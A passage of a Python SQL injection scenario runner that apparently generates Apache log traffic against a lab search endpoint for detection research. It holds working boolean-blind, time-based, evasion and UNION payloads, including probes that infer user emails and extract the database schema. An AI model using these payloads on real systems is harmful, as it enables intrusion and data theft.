#!/usr/bin/env python3
"""B-set Round 2 SQLi scenario runner.

Use only in approved local lab environments.
This runner is an Apache-log-oriented experiment harness. It standardizes
request generation and execution metadata. It does not verify SQLi success,
DB exfiltration, or auth bypass success.
"""

from __future__ import annotations

import argparse
import ipaddress
import json
import re
import statistics
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field, replace
from datetime import datetime
from pathlib import Path
from typing import Any


RUNNER_NAME = "b_set_r2_sqli_runner"
RUNNER_VERSION = "1.0"
DEFAULT_TIMEOUT_SEC = 30.0
DEFAULT_SLEEP_SCALE = 1.0
DEFAULT_INTER_REQUEST_SLEEP_SEC = 1.0
TIME_TRACK_SLEEP_SEC = 2.0
CHAIN_SLEEP_SEC = 0.5
READ_CHUNK_SIZE = 8192
OUTPUT_PLAN_JSON = "execution_plan.json"
OUTPUT_PLAN_MD = "execution_plan.md"
OUTPUT_METADATA_JSON = "run_metadata.json"
OUTPUT_RESULTS_JSONL = "request_results.jsonl"
OUTPUT_SUMMARY_MD = "run_summary.md"
OPTIONAL_SCENARIO_IDS = {"B-R2A-05", "B-R2A-06", "B-R2B-03"}
TIME_TRACK_SCENARIO_IDS = {"B-R2B-00", "B-R2B-01", "B-R2B-02", "B-R2B-03"}


@dataclass(frozen=True)
class RequestSpec:
    scenario_id: str
    scenario_label: str
    request_label: str
    method: str
    path: str
    expected_observation: str
    expected_interpretation: str
    expected_response: str
    interpretation_limit: str
    params: tuple[tuple[str, str], ...] = field(default_factory=tuple)
    sleep_after_sec: float | None = None
    is_optional: bool = False


def now_local_iso() -> str:
    return datetime.now().astimezone().isoformat(timespec="seconds")


def json_dumps(data: Any) -> str:
    return json.dumps(data, ensure_ascii=False, indent=2, sort_keys=True)


def write_text(path: Path, content: str) -> None:
    path.write_text(content, encoding="utf-8")


def write_json(path: Path, payload: Any) -> None:
    write_text(path, json_dumps(payload) + "\n")


def append_jsonl(path: Path, payload: Any) -> None:
    with path.open("a", encoding="utf-8") as handle:
        handle.write(json.dumps(payload, ensure_ascii=False) + "\n")


def normalize_base_url(raw_base_url: str) -> str:
    parsed = urllib.parse.urlparse(raw_base_url)
    if parsed.scheme not in {"http", "https"}:
        raise SystemExit("--base-url must include an http:// or https:// scheme")
    if not parsed.netloc:
        raise SystemExit("--base-url must include a host")
    if parsed.username or parsed.password:
        raise SystemExit("--base-url must not include username/password")
    if parsed.path not in {"", "/"} or parsed.params or parsed.query or parsed.fragment:
        raise SystemExit("--base-url must point to scheme://host[:port] without path/query")

    host = parsed.hostname
    if not host:
        raise SystemExit("Could not parse hostname from --base-url")
    if ":" in host and not host.startswith("["):
        authority_host = f"[{host}]"
    else:
        authority_host = host
    authority = authority_host if parsed.port is None else f"{authority_host}:{parsed.port}"
    return f"{parsed.scheme}://{authority}"


def classify_target_host(hostname: str) -> str:
    try:
        ip_obj = ipaddress.ip_address(hostname)
    except ValueError:
        normalized = hostname.lower()
        if normalized == "localhost" or normalized.endswith(".localhost"):
            return "local-hostname"
        if normalized.endswith(".local"):
            return "local-hostname"
        if normalized.endswith(".test"):
            return "test-hostname"
        return "general-hostname"

    if ip_obj.is_loopback:
        return "loopback-ip"
    if ip_obj.is_private:
        return "private-ip"
    return "public-ip"


def enforce_target_guard(
    base_url: str,
    dry_run: bool,
    allow_public_target: bool,
) -> str:
    parsed = urllib.parse.urlparse(base_url)
    hostname = parsed.hostname
    if not hostname:
        raise SystemExit("Could not parse hostname from --base-url")

    target_class = classify_target_host(hostname)
    if dry_run:
        return target_class

    if target_class in {"loopback-ip", "private-ip", "local-hostname", "test-hostname"}:
        return target_class

    if allow_public_target:
        print(
            "Warning: public/general target override enabled. Execute only in an "
            "approved local lab environment.",
            file=sys.stderr,
        )
        return target_class

    raise SystemExit(
        "Refusing to execute against a public IP or general hostname target. "
        "Use an approved local lab environment, run with --dry-run/--print-plan, "
        "or explicitly pass --allow-public-target."
    )


def slugify(value: str) -> str:
    return re.sub(r"[^a-z0-9]+", "-", value.lower()).strip("-")


def user_agent_for(prefix: str, scenario_id: str, request_label: str) -> str:
    return f"{prefix}-{slugify(scenario_id)}-{slugify(request_label)}"


def params_as_objects(params: tuple[tuple[str, str], ...]) -> list[dict[str, str]]:
    return [{"name": name, "value": value} for name, value in params]


def params_for_display(params: tuple[tuple[str, str], ...]) -> str:
    if not params:
        return "[]"
    return ", ".join(f"{name}={value}" for name, value in params)


def escape_md_cell(text: str) -> str:
    return text.replace("|", "\\|")


REQUESTS_BY_SCENARIO_ID: dict[str, list[RequestSpec]] = {
    "B-R2A-00": [
        RequestSpec(
            scenario_id="B-R2A-00",
            scenario_label="r2a_boolean_baseline",
            request_label="boolean_baseline_normal",
            method="GET",
            path="/rest/products/search",
            params=(("q", "apple"),),
            expected_observation="benign baseline search is visible in query_string",
            expected_interpretation="benign baseline; reference only",
            expected_response="200_or_4xx",
            interpretation_limit="benign_baseline_do_not_promote_to_candidate",
        )
    ],
    "B-R2A-01": [
        RequestSpec(
            scenario_id="B-R2A-01",
            scenario_label="r2a_boolean_xclose_pair",
            request_label="boolean_xclose_true",
            method="GET",
            path="/rest/products/search",
            params=(("q", "x')) OR 1=1 --"),),
            expected_observation="Boolean TRUE xclose form visible in query_string",
            expected_interpretation=(
                "Boolean blind SQLi TRUE arm; response_body_bytes delta is indirect physical evidence"
            ),
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit="no_result_count_confirmation_without_response_body",
        )
    ],
    "B-R2A-02": [
        RequestSpec(
            scenario_id="B-R2A-02",
            scenario_label="r2a_boolean_xclose_pair",
            request_label="boolean_xclose_false",
            method="GET",
            path="/rest/products/search",
            params=(("q", "x')) AND 1=2 --"),),
            expected_observation="Boolean FALSE xclose form visible in query_string",
            expected_interpretation=(
                "Boolean blind SQLi FALSE arm; compare bytes with TRUE"
            ),
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit="no_empty_result_confirmation_without_response_body",
        )
    ],
    "B-R2A-03": [
        RequestSpec(
            scenario_id="B-R2A-03",
            scenario_label="r2a_boolean_substr_pair",
            request_label="boolean_substr_true",
            method="GET",
            path="/rest/products/search",
            params=(("q", "apple' AND substr((SELECT email FROM Users LIMIT 1),1,1)='a"),),
            expected_observation=(
                "blind data inference TRUE-arm payload is visible in query_string"
            ),
            expected_interpretation=(
                "blind data inference intent; no character match confirmation"
            ),
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit="no_character_value_confirmation_without_response_body",
        )
    ],
    "B-R2A-04": [
        RequestSpec(
            scenario_id="B-R2A-04",
            scenario_label="r2a_boolean_substr_pair",
            request_label="boolean_substr_false",
            method="GET",
            path="/rest/products/search",
            params=(("q", "apple' AND substr((SELECT email FROM Users LIMIT 1),1,1)='z"),),
            expected_observation=(
                "blind data inference FALSE-arm payload is visible in query_string"
            ),
            expected_interpretation=(
                "blind data inference false arm; compare bytes with true arm"
            ),
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit="no_character_value_confirmation_without_response_body",
        )
    ],
    "B-R2A-05": [
        RequestSpec(
            scenario_id="B-R2A-05",
            scenario_label="r2a_boolean_quote_legacy_pair",
            request_label="boolean_quote_only_true",
            method="GET",
            path="/rest/products/search",
            params=(("q", "' OR 1=1 --"),),
            expected_observation=(
                "legacy quote-only TRUE-arm payload is visible in query_string"
            ),
            expected_interpretation=(
                "legacy quote-only Boolean TRUE arm kept for regression comparison only"
            ),
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit=(
                "OPTIONAL_LEGACY_SKIP_BY_DEFAULT; no_result_count_confirmation_without_response_body"
            ),
            is_optional=True,
        )
    ],
    "B-R2A-06": [
        RequestSpec(
            scenario_id="B-R2A-06",
            scenario_label="r2a_boolean_quote_legacy_pair",
            request_label="boolean_quote_only_false",
            method="GET",
            path="/rest/products/search",
            params=(("q", "' AND 1=2 --"),),
            expected_observation=(
                "legacy quote-only FALSE-arm payload is visible in query_string"
            ),
            expected_interpretation=(
                "legacy quote-only Boolean FALSE arm kept for regression comparison only"
            ),
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit=(
                "OPTIONAL_LEGACY_SKIP_BY_DEFAULT; no_empty_result_confirmation_without_response_body"
            ),
            is_optional=True,
        )
    ],
    "B-R2B-00": [
        RequestSpec(
            scenario_id="B-R2B-00",
            scenario_label="r2a_time_normal_baseline",
            request_label="time_normal_baseline_1",
            method="GET",
            path="/rest/products/search",
            params=(("q", "apple"),),
            expected_observation="normal baseline request for Apache duration comparison",
            expected_interpretation="benign duration baseline",
            expected_response="200_or_4xx",
            interpretation_limit="use_apache_duration_us_not_runner_duration_ms",
            sleep_after_sec=TIME_TRACK_SLEEP_SEC,
        ),
        RequestSpec(
            scenario_id="B-R2B-00",
            scenario_label="r2a_time_normal_baseline",
            request_label="time_normal_baseline_2",
            method="GET",
            path="/rest/products/search",
            params=(("q", "apple"),),
            expected_observation="normal baseline request for Apache duration comparison",
            expected_interpretation="benign duration baseline",
            expected_response="200_or_4xx",
            interpretation_limit="use_apache_duration_us_not_runner_duration_ms",
            sleep_after_sec=TIME_TRACK_SLEEP_SEC,
        ),
        RequestSpec(
            scenario_id="B-R2B-00",
            scenario_label="r2a_time_normal_baseline",
            request_label="time_normal_baseline_3",
            method="GET",
            path="/rest/products/search",
            params=(("q", "apple"),),
            expected_observation="normal baseline request for Apache duration comparison",
            expected_interpretation="benign duration baseline",
            expected_response="200_or_4xx",
            interpretation_limit="use_apache_duration_us_not_runner_duration_ms",
            sleep_after_sec=TIME_TRACK_SLEEP_SEC,
        ),
    ],
    "B-R2B-01": [
        RequestSpec(
            scenario_id="B-R2B-01",
            scenario_label="r2a_time_sqli_shape_baseline",
            request_label="time_sqli_shape_baseline_1",
            method="GET",
            path="/rest/products/search",
            params=(("q", "apple' AND 1=1"),),
            expected_observation=(
                "SQLi-shaped no-delay baseline payload is visible in query_string"
            ),
            expected_interpretation="SQLi-shaped no-delay baseline",
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit="use_apache_duration_us_not_runner_duration_ms",
            sleep_after_sec=TIME_TRACK_SLEEP_SEC,
        ),
        RequestSpec(
            scenario_id="B-R2B-01",
            scenario_label="r2a_time_sqli_shape_baseline",
            request_label="time_sqli_shape_baseline_2",
            method="GET",
            path="/rest/products/search",
            params=(("q", "apple' AND 1=1"),),
            expected_observation=(
                "SQLi-shaped no-delay baseline payload is visible in query_string"
            ),
            expected_interpretation="SQLi-shaped no-delay baseline",
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit="use_apache_duration_us_not_runner_duration_ms",
            sleep_after_sec=TIME_TRACK_SLEEP_SEC,
        ),
        RequestSpec(
            scenario_id="B-R2B-01",
            scenario_label="r2a_time_sqli_shape_baseline",
            request_label="time_sqli_shape_baseline_3",
            method="GET",
            path="/rest/products/search",
            params=(("q", "apple' AND 1=1"),),
            expected_observation=(
                "SQLi-shaped no-delay baseline payload is visible in query_string"
            ),
            expected_interpretation="SQLi-shaped no-delay baseline",
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit="use_apache_duration_us_not_runner_duration_ms",
            sleep_after_sec=TIME_TRACK_SLEEP_SEC,
        ),
    ],
    "B-R2B-02": [
        RequestSpec(
            scenario_id="B-R2B-02",
            scenario_label="r2a_time_randomblob_ladder",
            request_label="time_randomblob_1m",
            method="GET",
            path="/rest/products/search",
            params=(("q", "x')) AND (SELECT length(hex(randomblob(1000000))))>0 --"),),
            expected_observation=(
                "time-based randomblob ladder payload is visible in query_string"
            ),
            expected_interpretation="time-based SQLi delay probe",
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit=(
                "no_time_delay_success_confirmation_without_apache_duration_us; "
                "runner duration_ms is only a rough client-side measurement"
            ),
            sleep_after_sec=TIME_TRACK_SLEEP_SEC,
        ),
        RequestSpec(
            scenario_id="B-R2B-02",
            scenario_label="r2a_time_randomblob_ladder",
            request_label="time_randomblob_5m",
            method="GET",
            path="/rest/products/search",
            params=(("q", "x')) AND (SELECT length(hex(randomblob(5000000))))>0 --"),),
            expected_observation=(
                "time-based randomblob ladder payload is visible in query_string"
            ),
            expected_interpretation="time-based SQLi delay probe",
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit=(
                "no_time_delay_success_confirmation_without_apache_duration_us; "
                "runner duration_ms is only a rough client-side measurement"
            ),
            sleep_after_sec=TIME_TRACK_SLEEP_SEC,
        ),
        RequestSpec(
            scenario_id="B-R2B-02",
            scenario_label="r2a_time_randomblob_ladder",
            request_label="time_randomblob_10m",
            method="GET",
            path="/rest/products/search",
            params=(("q", "x')) AND (SELECT length(hex(randomblob(10000000))))>0 --"),),
            expected_observation=(
                "time-based randomblob ladder payload is visible in query_string"
            ),
            expected_interpretation="time-based SQLi delay probe",
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit=(
                "no_time_delay_success_confirmation_without_apache_duration_us; "
                "runner duration_ms is only a rough client-side measurement"
            ),
            sleep_after_sec=TIME_TRACK_SLEEP_SEC,
        ),
        RequestSpec(
            scenario_id="B-R2B-02",
            scenario_label="r2a_time_randomblob_ladder",
            request_label="time_randomblob_20m",
            method="GET",
            path="/rest/products/search",
            params=(("q", "x')) AND (SELECT length(hex(randomblob(20000000))))>0 --"),),
            expected_observation=(
                "time-based randomblob ladder payload is visible in query_string"
            ),
            expected_interpretation="time-based SQLi delay probe",
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit=(
                "no_time_delay_success_confirmation_without_apache_duration_us; "
                "runner duration_ms is only a rough client-side measurement"
            ),
            sleep_after_sec=TIME_TRACK_SLEEP_SEC,
        ),
    ],
    "B-R2B-03": [
        RequestSpec(
            scenario_id="B-R2B-03",
            scenario_label="r2a_time_randomblob_highload_optional",
            request_label="time_randomblob_30m",
            method="GET",
            path="/rest/products/search",
            params=(("q", "x')) AND (SELECT length(hex(randomblob(30000000))))>0 --"),),
            expected_observation=(
                "high-load randomblob time payload is visible in query_string"
            ),
            expected_interpretation="time-based SQLi delay probe with high-load characteristics",
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit=(
                "OPTIONAL_HIGHLOAD_DOS_ADJACENT_SKIP_BY_DEFAULT; "
                "isolated_environment_required"
            ),
            sleep_after_sec=TIME_TRACK_SLEEP_SEC,
            is_optional=True,
        )
    ],
    "B-R2B-E01": [
        RequestSpec(
            scenario_id="B-R2B-E01",
            scenario_label="r2b_evasion",
            request_label="evasion_url_encoded_quote",
            method="GET",
            path="/rest/products/search",
            params=(("q", "' OR 1=1 --"),),
            expected_observation="URL-encoded quote SQLi shape is visible in query_string",
            expected_interpretation="encoding/url decode SQLi intent",
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit="encoding_normalization_required_no_success_inference",
        )
    ],
    "B-R2B-E02": [
        RequestSpec(
            scenario_id="B-R2B-E02",
            scenario_label="r2b_evasion",
            request_label="evasion_mixed_case_union",
            method="GET",
            path="/rest/products/search",
            params=(("q", "x')) uNiOn SeLeCt 1,2,3,4,5,6,7,8,9 --"),),
            expected_observation=(
                "mixed-case UNION SELECT payload is visible in query_string"
            ),
            expected_interpretation="mixed-case SQL keyword evasion",
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit="keyword_normalization_required_no_success_inference",
        )
    ],
    "B-R2B-E03": [
        RequestSpec(
            scenario_id="B-R2B-E03",
            scenario_label="r2b_evasion",
            request_label="evasion_inline_comment_split",
            method="GET",
            path="/rest/products/search",
            params=(("q", "x'))/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,9/**/--"),),
            expected_observation=(
                "inline-comment token-splitting payload is visible in query_string"
            ),
            expected_interpretation="inline comment token splitting evasion",
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit="comment_sequence_visible_no_success_inference",
        )
    ],
    "B-R2B-E04": [
        RequestSpec(
            scenario_id="B-R2B-E04",
            scenario_label="r2b_evasion",
            request_label="evasion_double_url_encoding",
            method="GET",
            path="/rest/products/search",
            params=(("q", "%27%20OR%201%3D1%20--"),),
            expected_observation=(
                "double-encoded SQLi-like payload may require decoded-depth-2 interpretation"
            ),
            expected_interpretation="double decoded SQLi / decoded_depth_2",
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit="decoded_depth_2_required_no_success_inference",
        )
    ],
    "B-R2B-E05": [
        RequestSpec(
            scenario_id="B-R2B-E05",
            scenario_label="r2b_evasion",
            request_label="evasion_whitespace_tab_newline",
            method="GET",
            path="/rest/products/search",
            params=(("q", "x'))\tUNION\tSELECT\t1,2,3,4,5,6,7,8,9\n--"),),
            expected_observation=(
                "whitespace-variant UNION SELECT payload is visible in query_string"
            ),
            expected_interpretation="whitespace normalization evasion",
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit="whitespace_normalization_required_no_success_inference",
        )
    ],
    "B-R2B-C01": [
        RequestSpec(
            scenario_id="B-R2B-C01",
            scenario_label="r2b_chain",
            request_label="chain_step_01_quote_probe",
            method="GET",
            path="/rest/products/search",
            params=(("q", "apple'"),),
            expected_observation="chain step 1 quote probe is visible in query_string",
            expected_interpretation=(
                "individual low signal steps may be context, chain as a sequence is high signal"
            ),
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit=(
                "individual_step_may_be_low_signal_but_chain_context_is_relevant"
            ),
            sleep_after_sec=CHAIN_SLEEP_SEC,
        )
    ],
    "B-R2B-C02": [
        RequestSpec(
            scenario_id="B-R2B-C02",
            scenario_label="r2b_chain",
            request_label="chain_step_02_double_quote_probe",
            method="GET",
            path="/rest/products/search",
            params=(("q", "apple''"),),
            expected_observation="chain step 2 quote variation is visible in query_string",
            expected_interpretation=(
                "individual low signal steps may be context, chain as a sequence is high signal"
            ),
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit=(
                "individual_step_may_be_low_signal_but_chain_context_is_relevant"
            ),
            sleep_after_sec=CHAIN_SLEEP_SEC,
        )
    ],
    "B-R2B-C03": [
        RequestSpec(
            scenario_id="B-R2B-C03",
            scenario_label="r2b_chain",
            request_label="chain_step_03_parens_probe",
            method="GET",
            path="/rest/products/search",
            params=(("q", "apple')"),),
            expected_observation="chain step 3 parenthesis breakout is visible in query_string",
            expected_interpretation=(
                "individual low signal steps may be context, chain as a sequence is high signal"
            ),
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit=(
                "individual_step_may_be_low_signal_but_chain_context_is_relevant"
            ),
            sleep_after_sec=CHAIN_SLEEP_SEC,
        )
    ],
    "B-R2B-C04": [
        RequestSpec(
            scenario_id="B-R2B-C04",
            scenario_label="r2b_chain",
            request_label="chain_step_04_double_parens_probe",
            method="GET",
            path="/rest/products/search",
            params=(("q", "apple'))"),),
            expected_observation="chain step 4 deeper breakout is visible in query_string",
            expected_interpretation=(
                "individual low signal steps may be context, chain as a sequence is high signal"
            ),
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit=(
                "individual_step_may_be_low_signal_but_chain_context_is_relevant"
            ),
            sleep_after_sec=CHAIN_SLEEP_SEC,
        )
    ],
    "B-R2B-C05": [
        RequestSpec(
            scenario_id="B-R2B-C05",
            scenario_label="r2b_chain",
            request_label="chain_step_05_union_1col",
            method="GET",
            path="/rest/products/search",
            params=(("q", "x')) UNION SELECT 1 --"),),
            expected_observation="chain step 5 one-column UNION probe is visible in query_string",
            expected_interpretation=(
                "individual low signal steps may be context, chain as a sequence is high signal"
            ),
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit=(
                "individual_step_may_be_low_signal_but_chain_context_is_relevant"
            ),
            sleep_after_sec=CHAIN_SLEEP_SEC,
        )
    ],
    "B-R2B-C06": [
        RequestSpec(
            scenario_id="B-R2B-C06",
            scenario_label="r2b_chain",
            request_label="chain_step_06_union_3col",
            method="GET",
            path="/rest/products/search",
            params=(("q", "x')) UNION SELECT 1,2,3 --"),),
            expected_observation="chain step 6 three-column UNION probe is visible in query_string",
            expected_interpretation=(
                "individual low signal steps may be context, chain as a sequence is high signal"
            ),
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit=(
                "individual_step_may_be_low_signal_but_chain_context_is_relevant"
            ),
            sleep_after_sec=CHAIN_SLEEP_SEC,
        )
    ],
    "B-R2B-C07": [
        RequestSpec(
            scenario_id="B-R2B-C07",
            scenario_label="r2b_chain",
            request_label="chain_step_07_union_5col",
            method="GET",
            path="/rest/products/search",
            params=(("q", "x')) UNION SELECT 1,2,3,4,5 --"),),
            expected_observation="chain step 7 five-column UNION probe is visible in query_string",
            expected_interpretation=(
                "individual low signal steps may be context, chain as a sequence is high signal"
            ),
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit=(
                "individual_step_may_be_low_signal_but_chain_context_is_relevant"
            ),
            sleep_after_sec=CHAIN_SLEEP_SEC,
        )
    ],
    "B-R2B-C08": [
        RequestSpec(
            scenario_id="B-R2B-C08",
            scenario_label="r2b_chain",
            request_label="chain_step_08_union_7col",
            method="GET",
            path="/rest/products/search",
            params=(("q", "x')) UNION SELECT 1,2,3,4,5,6,7 --"),),
            expected_observation="chain step 8 seven-column UNION probe is visible in query_string",
            expected_interpretation=(
                "individual low signal steps may be context, chain as a sequence is high signal"
            ),
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit=(
                "individual_step_may_be_low_signal_but_chain_context_is_relevant"
            ),
            sleep_after_sec=CHAIN_SLEEP_SEC,
        )
    ],
    "B-R2B-C09": [
        RequestSpec(
            scenario_id="B-R2B-C09",
            scenario_label="r2b_chain",
            request_label="chain_step_09_union_9col",
            method="GET",
            path="/rest/products/search",
            params=(("q", "x')) UNION SELECT 1,2,3,4,5,6,7,8,9 --"),),
            expected_observation="chain step 9 nine-column UNION probe is visible in query_string",
            expected_interpretation=(
                "individual low signal steps may be context, chain as a sequence is high signal"
            ),
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit=(
                "individual_step_may_be_low_signal_but_chain_context_is_relevant"
            ),
            sleep_after_sec=CHAIN_SLEEP_SEC,
        )
    ],
    "B-R2B-C10": [
        RequestSpec(
            scenario_id="B-R2B-C10",
            scenario_label="r2b_chain",
            request_label="chain_step_10_schema_extract",
            method="GET",
            path="/rest/products/search",
            params=(("q", "x')) UNION SELECT 1,name,sql,4,5,6,7,8,9 FROM sqlite_master --"),),
            expected_observation="chain step 10 schema extraction probe is visible in query_string",
            expected_interpretation=(
                "individual low signal steps may be context, chain as a sequence is high signal"
            ),
            expected_response="200_or_4xx_or_5xx",
            interpretation_limit=(
                "individual_step_may_be_low_signal_but_chain_context_is_relevant"
            ),
            sleep_after_sec=CHAIN_SLEEP_SEC,
        )
    ],
    "B-R2B-F01": [
        RequestSpec(
            scenario_id="B-R2B-F01",
            scenario_label="r2b_false_positive_bait",
            request_label="fp_educational_union_query",
            method="GET",
            path="/rest/products/search",
            params=(("q", "How to use UNION in SQL"),),
            expected_observation="natural-language SQL keyword search is visible in query_string",
            expected_interpretation="educational query, not suspicious_sqli",
            expected_response="200_or_4xx",
            interpretation_limit="possible_false_positive_sql_keyword_search",
        )
    ],
    "B-R2B-F02": [
        RequestSpec(
            scenario_id="B-R2B-F02",
            scenario_label="r2b_false_positive_bait",
            request_label="fp_educational_select_tutorial",
            method="GET",
            path="/rest/products/search",
            params=(("q", "SELECT * FROM users tutorial"),),
            expected_observation="tutorial-style SQL keyword search is visible in query_string",
            expected_interpretation="likely_false_positive or filtered educational query",
            expected_response="200_or_4xx",
            interpretation_limit="possible_false_positive_sql_keyword_search",
        )
    ],
    "B-R2B-F03": [
        RequestSpec(
            scenario_id="B-R2B-F03",
            scenario_label="r2b_false_positive_bait",
            request_label="fp_benign_sql_performance_search",
            method="GET",
            path="/rest/products/search",
            params=(("q", "how to query database index in sql for performance"),),
            expected_observation=(
                "benign technical SQL search phrase is visible in query_string"
            ),
            expected_interpretation=(
                "benign technical search, should not become SQLi candidate"
            ),
            expected_response="200_or_4xx",
            interpretation_limit="possible_false_positive_sql_keyword_search",
        )
    ],
}

BOOLEAN_IDS = ["B-R2A-00", "B-R2A-01", "B-R2A-02", "B-R2A-03", "B-R2A-04"]
BOOLEAN_OPTIONAL_IDS = ["B-R2A-05", "B-R2A-06"]
TIME_IDS = ["B-R2B-00", "B-R2B-01", "B-R2B-02"]
TIME_OPTIONAL_IDS = ["B-R2B-03"]
EVASION_IDS = ["B-R2B-E01", "B-R2B-E02", "B-R2B-E03", "B-R2B-E04", "B-R2B-E05"]
CHAIN_IDS = [
    "B-R2B-C01",
    "B-R2B-C02",
    "B-R2B-C03",
    "B-R2B-C04",
    "B-R2B-C05",
    "B-R2B-C06",
    "B-R2B-C07",
    "B-R2B-C08",
    "B-R2B-C09",
    "B-R2B-C10",
]
FP_IDS = ["B-R2B-F01", "B-R2B-F02", "B-R2B-F03"]


def expand_scenario_selection(
    selection: str,
    include_optional: bool,
) -> list[str]:
    normalized = selection.strip()
    if not normalized:
        raise SystemExit("--scenario must not be empty")

    lowered = normalized.lower()
    if lowered == "boolean":
        return BOOLEAN_IDS + (BOOLEAN_OPTIONAL_IDS if include_optional else [])
    if lowered == "time":
        return TIME_IDS + (TIME_OPTIONAL_IDS if include_optional else [])
    if lowered == "evasion":
        return EVASION_IDS
    if lowered == "chain":
        return CHAIN_IDS
    if lowered == "fp":
        return FP_IDS
    if lowered == "r2a":
        return (
            BOOLEAN_IDS
            + (BOOLEAN_OPTIONAL_IDS if include_optional else [])
            + TIME_IDS
            + (TIME_OPTIONAL_IDS if include_optional else [])
        )
    if lowered == "r2b":
        return EVASION_IDS + CHAIN_IDS + FP_IDS
    if lowered in {"core", "all"}:
        return (
            BOOLEAN_IDS
            + (BOOLEAN_OPTIONAL_IDS if include_optional else [])
            + TIME_IDS
            + (TIME_OPTIONAL_IDS if include_optional else [])
            + EVASION_IDS
            + CHAIN_IDS
            + FP_IDS
        )

    scenario_ids: list[str] = []
    for raw_item in normalized.split(","):
        item = raw_item.strip().upper()
        if not item:
            raise SystemExit("Invalid --scenario: empty item in comma-separated list")
        if item not in REQUESTS_BY_SCENARIO_ID:
            valid_items = ", ".join(
                [
                    "all",
                    "core",
                    "boolean",
                    "time",
                    "evasion",
                    "chain",
                    "fp",
                    "r2a",
                    "r2b",
                ]
                + list(REQUESTS_BY_SCENARIO_ID)
            )
            raise SystemExit(f"Unknown scenario '{raw_item.strip()}'. Valid values: {valid_items}")
        if item in OPTIONAL_SCENARIO_IDS and not include_optional:
            raise SystemExit(
                f"Scenario {item} is optional/high-load and requires --include-optional."
            )
        if item not in scenario_ids:
            scenario_ids.append(item)
    return scenario_ids


def add_inter_request_sleep(
    requests: list[RequestSpec],
    default_sleep_sec: float,
) -> list[RequestSpec]:
    spaced: list[RequestSpec] = []
    for index, request_spec in enumerate(requests):
        if request_spec.sleep_after_sec is None:
            sleep_after_sec = default_sleep_sec if index < len(requests) - 1 else 0.0
        else:
            sleep_after_sec = request_spec.sleep_after_sec
        if index == len(requests) - 1:
            sleep_after_sec = 0.0
        spaced.append(replace(request_spec, sleep_after_sec=sleep_after_sec))
    return spaced


def build_request_plan(selection: str, include_optional: bool) -> list[RequestSpec]:
    plan: list[RequestSpec] = []
    for scenario_id in expand_scenario_selection(selection, include_optional):
        plan.extend(REQUESTS_BY_SCENARIO_ID[scenario_id])
    return add_inter_request_sleep(plan, DEFAULT_INTER_REQUEST_SLEEP_SEC)


def build_query_string(params: tuple[tuple[str, str], ...]) -> str:
    if not params:
        return ""
    return urllib.parse.urlencode(params, doseq=True, quote_via=urllib.parse.quote)


def build_full_url(base_url: str, path: str, params: tuple[tuple[str, str], ...]) -> str:
    if not path.startswith("/"):
        raise SystemExit(f"Request path must start with '/': {path}")
    query_string = build_query_string(params)
    if query_string:
        return f"{base_url}{path}?{query_string}"
    return f"{base_url}{path}"


def render_request(
    request_spec: RequestSpec,
    base_url: str,
    ua_prefix: str,
    sleep_scale: float,
) -> dict[str, Any]:
    user_agent = user_agent_for(
        ua_prefix,
        request_spec.scenario_id,
        request_spec.request_label,
    )
    return {
        "scenario_id": request_spec.scenario_id,
        "scenario_label": request_spec.scenario_label,
        "request_label": request_spec.request_label,
        "method": request_spec.method,
        "path": request_spec.path,
        "params": params_as_objects(request_spec.params),
        "user_agent": user_agent,
        "expected_observation": request_spec.expected_observation,
        "expected_interpretation": request_spec.expected_interpretation,
        "expected_response": request_spec.expected_response,
        "interpretation_limit": request_spec.interpretation_limit,
        "sleep_after_sec": request_spec.sleep_after_sec,
        "is_optional": request_spec.is_optional,
        "scaled_sleep_after_sec": round((request_spec.sleep_after_sec or 0.0) * sleep_scale, 3),
        "stores_response_body_content": False,
        "full_url": build_full_url(base_url, request_spec.path, request_spec.params),
    }


def build_plan_markdown(
    base_url: str,
    scenario: str,
    ua_prefix: str,
    sleep_scale: float,
    timeout_sec: float,
    requests: list[RequestSpec],
    dry_run: bool,
    target_class: str,
    include_optional: bool,
) -> str:
    lines = [
        "# B Set R2 SQLi Execution Plan",
        "",
        f"- mode: {'dry-run' if dry_run else 'execute'}",
        f"- base_url: {base_url}",
        f"- scenario: {scenario}",
        f"- ua_prefix: {ua_prefix}",
        f"- include_optional: {include_optional}",
        f"- request_count: {len(requests)}",
        f"- sleep_scale: {sleep_scale}",
        f"- timeout_sec: {timeout_sec}",
        f"- target_class: {target_class}",
        "- transport: urllib.request over http/https",
        "- safety: approved local lab only; public target execution is blocked by default",
        "- note: response body content is never stored; only body length may be recorded in execute mode",
        "",
        "| Scenario ID | scenario_label | request_label | method | path | params | optional | expected_interpretation | interpretation_limit |",
        "|---|---|---|---|---|---|---|---|---|",
    ]
    for request_spec in requests:
        lines.append(
            f"| {escape_md_cell(request_spec.scenario_id)} | "
            f"{escape_md_cell(request_spec.scenario_label)} | "
            f"{escape_md_cell(request_spec.request_label)} | "
            f"{escape_md_cell(request_spec.method)} | "
            f"{escape_md_cell(request_spec.path)} | "
